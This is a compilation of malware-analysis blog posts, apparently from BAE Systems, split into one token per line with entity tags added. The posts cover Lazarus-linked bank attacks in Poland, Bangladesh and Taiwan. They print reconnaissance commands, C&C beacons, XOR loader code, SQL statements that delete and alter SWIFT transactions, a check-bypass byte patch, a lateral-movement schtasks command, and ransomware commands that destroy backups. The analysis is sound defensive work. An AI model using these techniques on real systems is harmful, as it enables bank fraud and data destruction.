part
of
the
same
campaign
.

Despite
this
potential
connection
to
the
Poland
bank
compromises
,
the
malware
is
not
particularly
advanced
–
for
example
using
basic
operations
to
gather
system
information
.
The
malware
attempts
to
run
a
series
of
commands
with
cmd.exe B_malware.drop
and
then
returns
the
result
via
the
C&C
,
eye-watch[.]in  B_url.cncsvr
.

These
commands
are
as
follows
:
cmd.exe
/c
hostname
cmd.exe
/c
whoami
cmd.exe
/c
ver
cmd.exe
/c
ipconfig
-all
cmd.exe
/c
ping
www.google.com  B_url.normal
cmd.exe
/c
query
user
cmd.exe
/c
net
user
cmd.exe
/c
net
view
cmd.exe
/c
net
view
/domain
cmd.exe
/c
reg
query
'
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet

Settings
'
cmd.exe
/c
tasklist
/svc
cmd.exe
/c
netstat
-ano
|
find
'
TCP
'

An
example
C&C
beacon
is
seen
below
:

GET
/design/dfbox/list.jsp?action=What&u=10729854751740
HTTP/1.1

Connection
:
Keep-Alive

User-Agent
:
Mozilla/5.0
(
Windows
NT
6.1;
Win64;
x64;
rv:47.0
)
Gecko/20100101

Firefox/47.0

Host
:
www.eye-watch[.]in  B_url.cncsvr

SILVERLIGHT
XAP
FILE

The
cambio.xap
archive
sample
(
4cc10ab3f4ee6769e520694a10f611d5
)
does
not
use
eye-watch[.]in  B_url.cncsvr
as
a

C&C
channel
but
instead
was
downloaded
from
the
URL
:
hxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap B_url.cncsvr
'
cambio
'
is
Spanish
for
'
change
'
.
The
URL
is
similar
to
that
noted
in
the
BadCyber
blog
,
and
the
use
of
an
XAP
file
matches
what
can
be
found
in
the
Archive.org
cache
for
the
sap.misapor[.]ch
site
.

XAP
is
a
software
package
format
used
for
Microsoft
Silverlight
applications
.

It
can
be
opened
as
a
standard
ZIP
archive
and
contains
the
following
files
:

AppManifest.xaml
Shell_siver.dll
System.Xml.Linq.dll

Together
they
form
a
re-packaged
exploit
for
Silverlight
based
on
CVE-2016-0034
(
MS16-006
)
–
a
Silverlight
Memory
Corruption
vulnerability
.
The
exploit
has
previously
been
used
by
several
exploit
kits
including
RIG
and
Angler
to
deliver
multiple
crimeware
tools
.

The
Shell_siver.dll
file
contains
a
compile
path
:
c:\Users\KKK\Desktop\Shell_siver\Shell_siver\obj\Release\Shell_siver.pdb

Internally
,
the
code
of
this
DLL
loads
a
2nd
stage
library
called
binaryreader.Exploit
–
as
seen
below
with
the

XOR-encoded
string
:
byte[]
array
=
new
byte[]
115,120,127,112,99,104,99,116,112,117
,
116,99,63,84,105,97,125,126,120,101
this.InitializeComponent();
for
(
int
i
=
0;
i
<
array.Length;
i++
)
array[i]
^=
17;
if
(
args.get_InitParams().get_Keys().Contains('shell32
'
)
)
type.InvokeMember('run
'
,
256
,
null
,
obj
,
new
object[]
)

This
2nd
stage
payload
DLL
contained
within
the
assembly
is
30,720
bytes
in
size
and
encoded
with
XOR
56
:

Buffer.BlockCopy(Resource1._1
,
54
,
array
,
0
,
30720);
for
(
int
i
=
0;
i
<
array.Length;
i++
)
byte
b
=
56;
array[i]
^=
b;

Once
the
payload
stub
is
decoded
,
it
represents
itself
as
a
PE-image
,
which
is
another
.NET
4.0
assembly
with
the
internal
name
binaryreader.dll
.

This
second-stage
DLL
assembly
,
binaryreader.dll
,
is
heavily
obfuscated
.
The
DLL
(
MD5
hash
:
7b4a8be258ecb191c4c519d7c486ed8a  B_hash
)
is
identical
to
the
one
reported
in
a
malware
traffic
analysis
blog
post
from
March
2016
where
it
was
used
to
deliver
Qbot
.
Thus
it
is
likely
the
code
comes
from
a
criminal
exploit
kit
which
is
being
leveraged
for
delivery
in
this
campaign
.

A
similarly
named
cambio.swf
(
MD5
hash
:
6dffcfa68433f886b2e88fd984b4995a  B_hash
)
was
uploaded
to
VirusTotal
from
a
US
IP
address
in
December
2016
.

IP
WHITELISTS

When
examining
the
code
on
the
exploit
kit
website
a
list
of
255
IP
address
strings
was
found
.
The
IPs
only
contained
the
first
3
octets
,
and
would
have
been
used
to
filter
traffic
such
that
only
IPs
on
that
subnet
would
be
delivered
the
exploit
and
payload
.

The
IP
addresses
corresponded
to
a
mix
of
public
and
private
financial
institutions
spread
across
the
globe
:

However
,
banks
in
some
specific
countries
feature
prominently
in
the
list
:

Rank

Country

Poland

Count

United
States

Mexico

United
Kingdom
7

Chile

Brazil

Peru

Colombia

Denmark

India

The
prominence
of
Polish
and
Mexican
banks
matches
the
observation
of
watering-hole
code
on
sites
in
both
countries
.

CONCLUSIONS

The
evidence
available
is
currently
incomplete
and
at
the
moment
we
can
only
conclude
the
following
:
•
There
has
been
a
series
of
watering
hole
attacks
on
bank
supervisor
websites
in
Poland
&
Mexico
,
and
a
state
owned
bank
in
Uruguay
in
recent
months
.
These
leverage
Silverlight
and
Flash
exploits
to
deliver
malware
.
•
Investigators
in
Poland
have
identified
known
Lazarus
group
implants
on
bank
networks
and
associated
this
with
the
recent
compromise
of
the
Polish
Financial
Supervision
Authority's
website
.

The
technical/forensic
evidence
to
link
the
Lazarus
group
actors
(
who
we
believe
are
behind
the
Bangladesh
Bank
attack
and
many
others
in
2016
)
to
the
watering-hole
activity
is
unclear
.
However
,
the
choice
of
bank
supervisor
/
state-bank
websites
would
be
apt
,
given
their
previous
targeting
of
Central
Banks
for
Heists
–
even
when
it
serves
little
operational
benefit
for
infiltrating
the
wider
banking
sector
.

Nonetheless
,
further
evidence
to
connect
together
the
pieces
of
this
attack
is
needed
,
as
well
as
insights
into
the
end-goal
of
the
culprits
.
We
are
continuing
our
analysis
of
new
artefacts
as
they
emerge
and
may
issue
further
updates
in
due
course
.

RECOMMENDATIONS

We
recommend
organisations
use
the
indicators
provided
in
Appendix
A
to
update
their
defensive
systems
to
identify
attacks
.
For
compromised
legitimate
websites
we
would
suggest
a
minimum
1
month
block
be
placed
on
the
domain
.
Patches
against
CVE-2016-0034
should
be
applied
as
soon
as
possible
.

APPENDIX
A
-
INDICATORS
OF
ATTACK

C&C
IP
address
125.214.195.17  B_ip.cncsvr
196.29.166.218  B_ip.cncsvr

Compromised
site
knf.gov[.]pl  B_url.distribute
(
currently
clean
)
www.cnbv.gob[.]mx  B_url.distribute
(
currently
clean
)
brou.com[.]uy  B_url.distribute
(
currently
clean
)
sap.misapor[.]ch  B_url.distribute
www.eye-watch[.]in  B_url.cncsvr

MD5
Hashes
c1364bbf63b3617b25b58209e4529d8c  B_hash
85d316590edfb4212049c4490db08c4b  B_hash
1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae  B_hash
1507e7a741367745425e0530e23768e6  B_hash
911de8d67af652a87415f8c0a30688b2  B_hash
1f7897b041a812f96f1925138ea38c46  B_hash
cb52c013f7af0219d45953bae663c9a2  B_hash
4cc10ab3f4ee6769e520694a10f611d5  B_hash
7b4a8be258ecb191c4c519d7c486ed8a  B_hash
Two
bytes
to
$951m
baesystemsai.blogspot.co.uk B_url.normal
/2016/04/two-bytes-to-951m.html I

In
February
2016
one
of
the
largest
cyber
heists
was
committed
and
subsequently
disclosed
.
An
unknown
attacker
gained
access
to
the
Bangladesh
Bank's
(
BB
)
SWIFT
payment
system
and
reportedly
instructed
an
American
bank
to
transfer
money
from
BB's
account
to
accounts
in
The
Philippines
.
The
attackers
attempted
to
steal
$951m
,
of
which
$81m
is
still
unaccounted
for
.

The
technical
details
of
the
attack
have
yet
to
be
made
public
,
however
we've
recently
identified
tools
uploaded
to
online
malware
repositories
that
we
believe
are
linked
to
the
heist
.
The
custom
malware
was
submitted
by
a
user
in

Bangladesh
,
and
contains
sophisticated
functionality
for
interacting
with
local
SWIFT
Alliance
Access
software
running
in
the
victim
infrastructure
.

This
malware B_malware.infosteal
appears
to
be
just
part
of
a
wider
attack
toolkit
,
and
would
have
been
used
to
cover
the
attackers
'
tracks
as
they
sent
forged
payment
instructions
to
make
the
transfers
.
This
would
have
hampered
the
detection
and
response
to
the
attack
,
giving
more
time
for
the
subsequent
money
laundering
to
take
place
.

The
tools
are
highly
configurable
and
given
the
correct
access
could
feasibly
be
used
for
similar
attacks
in
the
future
.

Malware
samples

SHA1

Compile
time

Size
(
bytes
)
Filename
525a8e3ae4e3df8c9c61f2a49e38541d196e9228
2016-02-05
11:46:20
65,536
evtdiag.exe B_malware.drop
76bab478dcc70f979ce62cd306e9ba50ee84e37e
2016-02-04
13:45:39
16,384
evtsys.exe B_malware.drop
70bf16597e375ad691f2c1efa194dbe7f60e4eeb
2016-02-05
08:55:19
24,576
nroff_b.exe B_malware.drop
6207b92842b28a438330a2bf0ee8dcab7ef0a163
N/A
33,848
gpca.dat B_malware.unknown

We
believe
all
files
were
created
by
the
same
actor
(
s
)
,
but
the
main
focus
of
the
report
will
be
on
525a8e3ae4e3df8c9c61f2a49e38541d196e9228
as
this
is
the
component
that
contains
logic
for
interacting
with
the
SWIFT
software
.

The
malware
registers
itself
as
a
service
and
operates
within
an
environment
running
SWIFT's
Alliance
software
suite
,
powered
by
an
Oracle
Database
.

The
main
purpose
is
to
inspect
SWIFT
messages
for
strings
defined
in
the
configuration
file
.
From
these
messages
,
the
malware
can
extract
fields
such
as
transfer
references
and
SWIFT
addresses
to
interact
with
the
system
database
.
These
details
are
then
used
to
delete
specific
transactions
,
or
update
transaction
amounts
appearing
in
balance
reporting
messages
based
on
the
amount
of
Convertible
Currency
available
in
specific
accounts
.

This
functionality
runs
in
a
loop
until
6am
on
6th
February
2016
.
This
is
significant
given
the
transfers
are
believed
to
have
occurred
in
the
two
days
prior
to
this
date
.
The
tool
was
custom
made
for
this
job
,
and
shows
a
significant
level
of
knowledge
of
SWIFT
Alliance
Access
software
as
well
as
good
malware
coding
skills
.

Malware
config
and
logging

When
run
,
the
malware
decrypts
the
contents
of
its
configuration
file
,
using
the
RC4
key
:
4e
38
1f
a7
7f
08
cc
aa
0d
56
ed
ef
f9
ed
08

This
configuration
is
located
in
the
following
directory
on
the
victim
device
:
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\gpca.dat

The
configuration
file
contains
a
list
of
transaction
IDs
,
some
additional
environment
information
,
and
the
following

IP
address
to
be
used
for
command-and-control
(
C&C
)
:
196.202.103.174 B_ip.cncsvr

The
sample
also
uses
the
following
file
for
logging
:
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\recas.dat

Module
patching

The
malware
enumerates
all
processes
,
and
if
a
process
has
the
module
liboradb.dll
loaded
in
it
,
it
will
patch
2
bytes
in
its
memory
at
a
specific
offset
.
The
patch
will
replace
2
bytes
0x75
and
0x04
with
the
bytes
0x90
and
0x90
.

These
two
bytes
are
the
JNZ
opcode
,
briefly
explained
as
'
if
the
result
of
the
previous
comparison
operation
is
not
zero
,
then
jump
into
the
address
that
follows
this
instruction
,
plus
4
bytes
'
.

Essentially
,
this
opcode
is
a
conditional
jump
instruction
that
follows
some
important
check
,
such
as
a
key
validity
check
or
authorisation
success
check
.

The
patch
will
replace
this
2-byte
conditional
jump
with
2
'
do-nothing
'
(
NOP
)
instructions
,
effectively
forcing
the
host
application
to
believe
that
the
failed
check
has
in
fact
succeeded
.

For
example
,
the
original
code
could
look
like
:
85
C0
test
eax
,
eax
;
some
important
check
75
04
jnz
failed
;
if
failed
,
jump
to
'
failed
'
label
below
33
c0
xor
eax
,
eax
;
otherwise
,
set
result
to
0
(
success
)
eb
17
jmp
exit
;
and
then
exit
failed
:

B8
01
00
00
00
mov
eax
,
1
;
set
result
to
1
(
failure
)

Once
it's
patched
,
it
would
look
like
:
85
C0
test
eax
,
eax
;
some
important
check
90
nop
;
'
do
nothing
'
in
place
of
0x75
90
nop
;
'
do
nothing
'
in
place
of
0x04
33
c0
xor
eax
,
eax
;
always
set
result
to
0
(
success
)
eb
17
jmp
exit
;
and
then
exit
failed
:

B8
01
00
00
00
mov
eax
,
1
;
never
reached
:
set
result
to
1
(
fail
)

As
a
result
,
the
important
check
result
will
be
ignored
,
and
the
code
will
never
jump
to
'
failed
'
.
Instead
,
it
will
proceed
into
setting
result
to
0
(
success
)
.

The
liboradb.dll
module
belongs
to
SWIFT's
Alliance
software
suite
,
powered
by
Oracle
Database
,
and
is
responsible
for
:
•
Reading
the
Alliance
database
path
from
the
registry;
•
Starting
the
database;
•
Performing
database
backup
&
restore
functions
.

By
modifying
the
local
instance
of
SWIFT
Alliance
Access
software
,
the
malware
grants
itself
the
ability
to
execute
database
transactions
within
the
victim
network
.

SWIFT
message
monitoring

The
malware
monitors
SWIFT
Financial
Application
(
FIN
)
messages
,
by
parsing
the
contents
of
the
files
*.prc
and
*.fal
located
within
the
directories
:
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcm\in\
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcm\out\

It
parses
the
messages
,
looking
for
strings
defined
in
gpca.dat
.
We
expect
these
will
be
unique
identifiers
that
identify
malicious
transactions
initiated
by
the
attackers
.
If
present
,
it
then
attempts
to
extract
a
MESG_TRN_REF
and
MESG_SENDER_SWIFT_ADDRESS
from
that
same
message
by
looking
for
the
following
hard
coded
strings
:
'
FIN
900
Confirmation
of
Debit
'
'
20
:
Transaction
'
'
Sender
:
'
[
additional
filters
from
the
decrypted
configuration
file
gpca.dat
]

The
malware
will
use
this
extracted
data
to
form
valid
SQL
statements
.
It
attempts
to
retrieve
the
SWIFT
unique
message
ID
(
MESG_S_UMID
)
that
corresponds
to
the
transfer
reference
and
sender
address
retrieved
earlier
:

SELECT
MESG_S_UMID
FROM
SAAOWNER.MESG_%s
WHERE
MESG_SENDER_SWIFT_ADDRESS
LIKE
'
%%%s%%
'
AND
MESG_TRN_REF
LIKE
'
%%%s%%';

The
MESG_S_UMID
is
then
passed
to
DELETE
statements
,
deleting
the
transaction
from
the
local
database
.

DELETE
FROM
SAAOWNER.MESG_%s
WHERE
MESG_S_UMID
=
'
%s';

DELETE
FROM
SAAOWNER.TEXT_%s
WHERE
TEXT_S_UMID
=
'
%s';

The
SQL
statements
are
dropped
into
a
temporary
file
with
the
'
SQL
'
prefix
.
The
SQL
statements
are
prepended
with
the
following
prefixed
statements
:
set
heading
off;
set
linesize
32567;
SET
FEEDBACK
OFF;
SET
ECHO
OFF;
SET
FEED
OFF;
SET
VERIFY
OFF;

Once
the
temporary
file
with
the
SQL
statements
is
constructed
,
it
is
executed
from
a
shell
script
with
'
sysdba
'
permissions
.
An
example
is
shown
below
:
cmd.exe
/c
echo
exit
|
sqlplus
-S
/
as
sysdba
@[SQL_Statements]
>
[OUTPUT_FILE]

Login
monitoring

After
start
up
the
malware
falls
into
a
loop
where
it
constantly
checks
for
the
journal
record
that
contains
the
'
Login
'
string
in
it
:

SELECT
*
FROM
(
SELECT
JRNL_DISPLAY_TEXT
,
JRNL_DATE_TIME
FROM
SAAOWNER.JRNL_%s
WHERE
JRNL_DISPLAY_TEXT
LIKE
'
%%LT
BBHOBDDHA
:
Log%%
'
ORDER
BY
JRNL_DATE_TIME
DESC
)
A
WHERE

ROWNUM
=
1;

NOTE
:
'
BBHOBDDH
'
is
the
SWIFT
code
for
the
Bangladesh
Bank
in
Dhaka
.

If
it
fails
to
find
the
'
Login
'
record
,
it
falls
asleep
for
5
seconds
and
then
tries
again
.
Once
the
'
Login
'
record
is
found
,
the
malware
sends
a
GET
request
to
the
remote
C&C
.

The
GET
request
has
the
format
:
[C&C_server]
/
al
?
[data]

The
malware
notifies
the
remote
C&C
each
hour
of
events
,
sending
'
---O
'
if
the
'
Login
'
(
open
)
event
occurred
,
'
---C
'
in
case
'
Logout
'
(
close
)
event
occurred
,
or
'
---N
'
if
neither
of
the
events
occurred
,
e.g.
:
[C&C_server]/al?---
O

Manipulating
balances

The
malware
monitors
all
SWIFT
messages
found
in
:
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcp\in\*.*
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcp\out\*.*
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcp\unk\*.*
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcs\nfzp
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcs\nfzf
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcs\fofp
[ROOT_DRIVE]:\Users\Administrator\AppData\Local\Allians\mcs\foff

The
messages
are
parsed
looking
for
information
tagged
with
the
following
strings
:
"
19A
:
Amount
"
:
Debit
"
Debit/Credit
:
"
Sender
:
"
Amount
:
"
FEDERAL
RESERVE

BANK
"
D
"
C
"
62F
:
"
60F
:
"
60M
:
"
62M
:
"
Credit
"
Debit
"
64
:
"
20
:
Transaction
"
90B
:
Price
"

For
example
,
the
"
62F
:
"
field
specifies
the
closing
balance
,
"
60F
:
"
is
opening
balance
,
"
19A
:
"
is
transaction
amount
.

The
malware
also
checks
if
the
messages
contain
a
filter
specified
within
the
configuration
file
gpca.dat
.

The
logged
in
account
,
as
seen
from
the
journal
,
is
then
used
to
check
how
much
Convertible
Currency
amount
(
MESG_FIN_CCY_AMOUNT
)
it
has
available
:

SELECT
MESG_FIN_CCY_AMOUNT
FROM
SAAOWNER.MESG_%s
WHERE
MESG_S_UMID
=
'
%s';

Alternatively
,
it
can
query
for
a
message
for
a
specified
sender
with
a
specified
amount
of
Convertible
Currency
:

SELECT
MESG_S_UMID
FROM
SAAOWNER.MESG_%s
WHERE
MESG_SENDER_SWIFT_ADDRESS
LIKE
'
%%%s%%
'
AND
MESG_FIN_CCY_AMOUNT
LIKE
'
%%%s%%';

The
amount
of
Convertible
Currency
is
then
manipulated
in
the
message
by
changing
it
to
the
arbitrary
value
(
SET
MESG_FIN_CCY_AMOUNT
)
:

UPDATE
SAAOWNER.MESG_%s
SET
MESG_FIN_CCY_AMOUNT
=
'
%s
'
WHERE
MESG_S_UMID
=
'
%s';

UPDATE
SAAOWNER.TEXT_%s
SET
TEXT_DATA_BLOCK
=
UTL_RAW.CAST_TO_VARCHAR2('%s
'
)
WHERE
TEXT_S_UMID
=
'
%s';

Printer
manipulation

In
order
to
hide
the
fraudulent
transactions
carried
out
by
the
attacker(s
)
,
the
database/message
manipulations
are
not
sufficient
.
SWIFT
network
also
generates
confirmation
messages
,
and
these
messages
are
sent
by
the
software
for
printing
.
If
the
fraudulent
transaction
confirmations
are
printed
out
,
the
banking
officials
can
spot
an
anomaly
and
then
respond
appropriately
to
stop
such
transactions
from
happening
.

Hence
,
the
malware
also
intercepts
the
confirmation
SWIFT
messages
and
then
sends
for
printing
the
'
doctored
'
(
manipulated
)
copies
of
such
messages
in
order
to
cover
up
the
fraudulent
transactions
.

To
achieve
that
,
the
SWIFT
messages
the
malware
locates
are
read
,
parsed
,
and
converted
into
PRT
files
that
describe
the
text
in
Printer
Command
Language
(
PCL
)
.

These
temporary
PRT
files
are
then
submitted
for
printing
by
using
another
executable
file
called
nroff.exe
,
a
legitimate
tool
from
the
SWIFT
software
suite
.

The
PCL
language
used
specifies
the
printer
model
,
which
is
'
HP
LaserJet
400
M401
'
:

Once
sent
for
printing
,
the
PRT
files
are
then
overwritten
with
'
0's
(
reliably
deleted
)
.

CONCLUSIONS

The
analysed
sample
allows
a
glimpse
into
the
toolkit
of
one
of
the
team
in
well-planned
bank
heist
.
Many
pieces
of
the
puzzle
are
still
missing
though
:
how
the
attackers
sent
the
fraudulent
transfers;
how
the
malware
was
implanted;
and
crucially
,
who
was
behind
this
.

This
malware
was
written
bespoke
for
attacking
a
specific
victim
infrastructure
,
but
the
general
tools
,
techniques
and
procedures
used
in
the
attack
may
allow
the
gang
to
strike
again
.
All
financial
institutions
who
run
SWIFT
Alliance

Access
and
similar
systems
should
be
seriously
reviewing
their
security
now
to
make
sure
they
too
are
not
exposed
.

This
attacker
put
significant
effort
into
deleting
evidence
of
their
activities
,
subverting
normal
business
processes
to
remain
undetected
and
hampering
the
response
from
the
victim
.
The
wider
lesson
learned
here
may
be
that
criminals
are
conducting
more
and
more
sophisticated
attacks
against
victim
organisations
,
particularly
in
the
area
of
network
intrusions
(
which
has
traditionally
been
the
domain
of
the
'
APT
'
actor
)
.
As
the
threat
evolves
,
businesses
and
other
network
owners
need
to
ensure
they
are
prepared
to
keep
up
with
the
evolving
challenge
of
securing
critical
systems
.
Taiwan
Heist
:
Lazarus
Tools
and
Ransomware
baesystemsai.blogspot.kr B_url.normal
/2017/10/taiwan-heist-lazarus-tools.html I

Written
by
Sergei
Shevchenko
,
Hirman
Muhammad
bin
Abu
Bakar
,
and
James
Wong

BACKGROUND

Reports
emerged
just
over
a
week
ago
of
a
new
cyber-enabled
bank
heist
in
Asia
.

Attackers
targeting
Far
Eastern
International
Bank
(
FEIB
)
,
a
commercial
firm
in
Taiwan
,
moved
funds
from
its
accounts
to
multiple
overseas
beneficiaries
.

In
a
story
which
reminds
us
of
the
Bangladesh
Bank
case
–
the
culprits
had
compromised
the
bank's
system
connected
to
the
SWIFT
network
and
used
this
to
perform
the
transfers
.

In
recent
days
,
various
malware
samples
have
been
uploaded
to
malware
repositories
which
appear
to
originate
from
the
intrusion
.

These
include
both
known
Lazarus
group
tools
,
as
well
as
a
rare
ransomware
variant
called
'
Hermes B_malware.ransom
'
which
may
have
been
used
as
a
distraction
or
cover-up
for
the
security
team
whilst
the
heist
was
occurring
.

The
timeline
below
provides
an
overview
of
the
key
events
:

October
2017

October
2017

October
2017

October
2017

October
2017

October
2017

October
2017

Malware
compiled
containing
admin
credentials
for
the
FEIB
network
.

Transfers
using
MT103
messages
were
sent
from
FEIB
to
Cambodia
,
the
US
and
Sri
Lanka
.

Messages
to
cover
the
funds
for
the
payments
were
incorrectly
created
and
sent
.

Breach
discovered
and
ransomware
uploaded
to
online
malware
repository
site
.

Individual
in
Sri
Lanka
cashes
out
a
reported
Rs30m
(
~$195,000
)
.

Individual
returns
to
collect
more
cash
from
account
,
arrested
whilst
doing
so
.

Press
become
aware
of
the
incident
.

Samples
uploaded
which
include
known
Lazarus B_malware.unknown
malware I
.

Little
information
is
available
at
present
about
when
or
how
the
attackers
compromised
the
bank
,
but
it
is
likely
more
details
will
emerge
in
the
coming
weeks
.

This
blogpost
seeks
to
summarise
what
is
in
the
public
domain
at
the
moment
,
as
well
as
analyse
the
samples
uploaded
to
malware
repositories
.

ANALYSIS

Several
files
have
been
uploaded
to
malware
databases
which
appear
to
be
related
to
this
attack
,
including
an
archive
titled

1/10

'
FEIB_Samples
'
submitted
from
Taiwan
on
12th
Oct
2017
.

These
and
other
samples
are
listed
below
:

#
MD5

Submitted

From
1
9563e2f443c3b4e1b00f25be0a30d56e B_hash
FEIB_Samples_pwd(Virus).zi_
TW

Filenames
2
d08f1211fe0138134e822e31a47ec5d4 B_hash
bitsran.exe B_malware.drop
3
b27881f59c8d8cc529fa80a58709db36 B_hash
RSW7B37.tmp B_malware.unknown
4
3c9e71400b72cc0213c9c3e4ab4df9df B_hash
msmpeng.exe
5
0edbad9e6041d43f97c7369439a40138 B_hash
FileTokenBroker.dll
6
97aaf130cfa251e5207ea74b2558293d B_hash
splwow32.exe
7
62217af0299d6e241778adb849fd2823 B_hash
N/A
8
0dd7da89b7d1fe97e669f8b4156067c8 B_hash
N/A
9
61075faba222f97d3367866793f0907b B_hash
N/A

First

Seen
201710-12
02:50:16
201710-03
01:01:31
201710-03
01:01:37
201710-07
08:58:00
201710-12
02:50:15
201710-12
02:50:15
201710-08
03:32:47
201703-14
02:13:01
201702-16
03:25:00

Compile

Time
201710-01
15:37:31
201710-01
11:34:07
201702-20
11:09:30
201701-05
01:11:33
201702-20
11:09:30
201709-21
09:27:43
201703-06
17:32:58
201702-10
15:03:30

File
#1
is
the
ZIP
file
containing
samples
#2-6
inside
.

Samples
#2-4
were
also
separately
uploaded
by
users
in
Taiwan
and
the
US
on
the
dates
given
above
.

Samples
#7-9
are
older
versions
of
the
Hermes B_malware.ransom
ransomware I
.

Malware
Analysis
–
Sample
#2;
Bitsran B_malware.drop
loader I
/ I
spreader I

Sample
#2
is
designed
to
run
and
spread
a
malicious
payload
on
the
victim's
network
.

On
execution
,
the
malware
places
a
copy
of
itself
into
the
location
:

C:\Windows\Temp\bitsran.exe B_malware.drop

Next
,
the
file
establishes
a
persistence
mechanism
with
the
registry
key
:

HKLM\Software\Microsoft\Windows\CurrentVersion\Run

2/10

It
sets
the
value
of
'
BITSRAN B_malware.drop
'
to
point
to
the
executable
in
the
Temp
location
above
.

The
malware
then
enumerates
all
processes
,
searching
for
specific
anti-virus
processes
and
attempts
to
kill
these
using
the
command
line
tool
taskkill
.

Process
Description

Trend
Micro
Unauthorized
Change
Prevention
Service

Trend
Micro
OfficeScan
NT
RealTime
Scan

Trend
Micro
OfficeScan
Common
Client
Solution
Framework

Process
Name
tmbmsrv.exe
tmccsf.exe
cntaosmgr.exe
Trend
Micro
OfficeScan
Add-on
Service
Client
Management
Service
ntrtscan.exe
pccntmon.exe
tmlisten.exe
tmpfw.exe

Trend
Micro
OfficeScan
Antivirus
real-time
scan
monitor

Trend
Micro
OfficeScan
NT
Listener

Trend
Micro
OfficeScan
NT
Firewall

Next
,
the
process
attempts
to
find
an
embedded
'
IMAGE
'
resource
with
offset
#110

.
If
successful
,
this
file
is
loaded
into
memory
.

When
manually
extracting
this
file
,
it
can
be
seen
to
represent
a
pixelated
bitmap
(
BMP
)
file
.

However
,
further
investigation
reveals
that
the
file
is
what
is
known
as
a
'
Polyglot
'
file
,
whereby
a
file
is
contained
within
another
file
.

Using
a
HEX
viewer
,
it
is
possible
to
see
that
this
file
also
contains
a
ZIP
file
(
beginning
at
the
'
PK
'
header
)
,
with
the
pixelated
image
above
referencing
the
bytes
of
the
file
to
be
RGB
values
.

3/10

The
contents
of
this
resource
is
decompressed
from
offset
54
,
with
the
last
4
bytes
of
the
file
specifying
the
ZIP's
file
size
in
bytes
.

When
successfully
decrypted
,
the
file
is
saved
into
the
same
directory
as
the
initial
executable
.

This
takes
the
filename
'
RSWXXXX.tmp B_malware.unknown
'
,
where
'
XXXX
'
is
randomly
generated
through
the
GetTempFileName
function
.

Once
written
to
disk
,
this
process
is
created
through
the
CreateProcess
function
.

Sample
#3
(
RSW7B37.tmp B_malware.unknown
)
is
an
example
of
this
file
.

Whilst
this
additional
payload
is
executing
,
the
initial
malware
attempts
to
copy
itself
to
other
devices
on
the
network
.

Two
user
accounts
are
hardcoded
into
the
malware
,
and
are
used
to
establish
connections
to
the
C$
SMB
shares
on
Windows
devices
.

These
are
the
accounts
:

Account
Name

Account
Password

FEIB\SPUSER14
#ED{REMOVED}

FEIB\scomadmin
!it{REMOVED}

Both
accounts
clearly
relate
to
FEIB
,
though
we
couldn't
confirm
whether
the
credentials
are
valid
or
not
.

The
SPUSER14
may
be
a
Sharepoint
user
account
whilst
scomadmin
likely
corresponds
to
System
Center
Operations
Manager
admin
–
an
account
for
managing
machines
in
a
data
centre
.

Instead
of
enumerating
all
devices
on
the
network
,
the
malware
iterates
through
a
hardcoded
list
of
5357
IP
addresses
,
in
the
ranges
:
•
10.49.*
•
10.50.*
•
10.51.*
•
10.59.*

It
is
assumed
that
previous
reconnaissance
was
conducted
by
the
actors
on
the
internal
network
to
identify
active
and
responding
devices
,
as
well
as
capturing
admin
credentials
for
the
network
.

If
a
device
successfully
responds
to
a
SMB
packet
on
port
445
,
the
malware
copies
itself
to
the
C$
network
share
using
the
provided
credentials
,
writing
the
file
to
the
location
:

C:\Windows\Temp\bitsran.exe B_malware.drop

If
successful
,
a
further
command
is
executed
using
the
same
credentials
,
to
create
a
scheduled
task
on
the
remote
device
with
the
name
'
BITSRAN B_malware.drop
'
.

The
full
command
executed
is
:

cmd.exe
/c
schtasks
/create
/tn
'
BITSRAN B_malware.drop
'
/tr
/s
/u
/p
/st
00:00
/et
23:59
/sc
minute
/mo
1
/ru
system
/f

Malware
Analysis
–
Sample
#3
,
Dropped
file
/
Hermes B_malware.ransom
Ransomware I

The
dropped
file
is
a
variant
of
the
Hermes B_malware.ransom
ransomware I
.

The
ransomware
calls
GetSystemDefaultLangID
(
)
to
obtain
language
identifier
for
the
system
locale
.

It
contains
a
list
of
three
system
language
codes
:
0x0419
(
Russian
)
,
0x0422
(
Ukrainian
)
,
and
0x0423
(
Belarusian
)
.

However
,
it
only
checks
against
the
last
two
,
and
,
if
matching
,
the
malware
quits
.

Whether
this
is
a
false-flag
or
not
is
unknown
.

4/10

The
ransomware
deletes
the
Volume
Shadow
Copies
(
a
type
of
backup
on
Windows
)
,
using
command
:

vssadmin
Delete
Shadows
/all

/quiet

Following
that
,
it
deletes
all
VSS
(
Volume
Shadow
Copy
Service
)
backup
files
(
which
include
System
Restore
files
)
and
orphaned
shadows
,
by
running
commands
below
for
the
drives
from
C
:
,
D
:
,
E
:
,
F
:
,
G
:
,
and
H
:

vssadmin
resize
shadowstorage
/for=%DRIVE%
/on=%DRIVE%
/maxsize=401MB
vssadmin
resize
shadowstorage
/for=%DRIVE%
/on=%DRIVE%
/maxsize=unbounded

The
trick
above
is
called
'
pulling
the
carpet
'
as
it
forces
Windows
to
voluntarily
dump
all
shadows
due
to
lack
of
space
.

The
ransomware
then
recursively
deletes
all
backup
files
from
the
drives
C
:
,
D
:
,
E
:
,
F
:
,
G
:
,
and
H
:
,
having
the
following
extensions
:

•
*.VHD

•
*.bac

•
*.bak

•
*.wbcat

•
*.bkf

•
Backup*.*

•
backup*.*

•
*.set

•
*.win

•
*.dsk

Using
Windows
CryptoAPI
platform
,
the
malware
creates
an
exchange
key
pair
,
and
then
exports
the
2,048-bit
public
RSA
key
into
an
external
file
called
PUBLIC
.

The
ransomware
then
enumerates
both
local
and
network
resources
,
and
encrypts
files
using
2,048-bit
RSA
algorithm
.

Each
encrypted
directory
will
have
a
ransom
note
left
in
it
:

